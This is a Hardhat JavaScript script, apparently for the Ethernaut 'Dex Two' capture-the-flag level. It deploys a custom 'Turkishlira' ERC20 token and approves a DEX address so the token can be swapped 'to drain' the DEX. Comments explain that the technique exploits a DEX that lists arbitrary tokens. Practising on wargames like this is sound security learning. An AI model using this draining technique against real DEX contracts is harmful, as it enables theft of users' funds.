// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const hre = require("hardhat");

async function main() {
  const dexAddr="0x7871D27a75715122e901aD34259285ad7719f0A0"
  const owner="0x92e5c70Dd41824a0617e07271A7E1e81A9BcE064"
  const name="Turkishlira"
  const symbol="TL"
  const TrLira = await hre.ethers.getContractFactory("Turkishlira");
  const trLira = await TrLira.deploy(400);

  await trLira.deployed();

  console.log(
    `Turkish-lira deployed to ${trLira.address}`
  );
  //! After deployment of your token ,approve with dex address to let it swap token 
  await trLira.approve(dexAddr,400)
  //! u can use it to swap with other tokens to drain in ethernaut console...
  //? Other ERC20 tokens, especially those designed by adversaries could behave more maliciously.
  //? If you design a DEX where anyone could list their own tokens without the permission of a central authority,
  //? then the correctness of the DEX could depend on the interaction 
  //? of the DEX contract and the token contracts being traded.
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
